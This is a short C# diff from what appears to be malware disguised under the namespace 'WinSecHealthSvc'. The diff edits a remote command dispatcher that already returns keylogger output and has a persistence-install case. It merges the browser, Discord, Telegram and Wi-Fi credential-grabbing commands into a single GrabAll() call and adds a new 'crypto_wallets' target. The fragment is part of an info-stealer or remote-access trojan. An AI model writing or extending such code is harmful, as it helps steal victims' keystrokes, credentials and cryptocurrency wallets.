@@ -614,19 +614,13 @@ namespace WinSecHealthSvc
                         output = "Keylog:\n" + _keylog.ToString();
                         break;
                     case "browsers":
-                        output = GrabBrowsers();
-                        break;
-                    case "grabber":
-                        output = GrabAll();
-                        break;
                     case "discord":
-                        output = GrabDiscord();
-                        break;
                     case "telegram":
-                        output = GrabTelegram();
-                        break;
                     case "wifi":
-                        output = GrabWifi();
+                    case "crypto_wallets":
+                    case "grabber":
+                    case "grab":
+                        output = GrabAll();
                         break;
                     case "persist_install":
                         try {
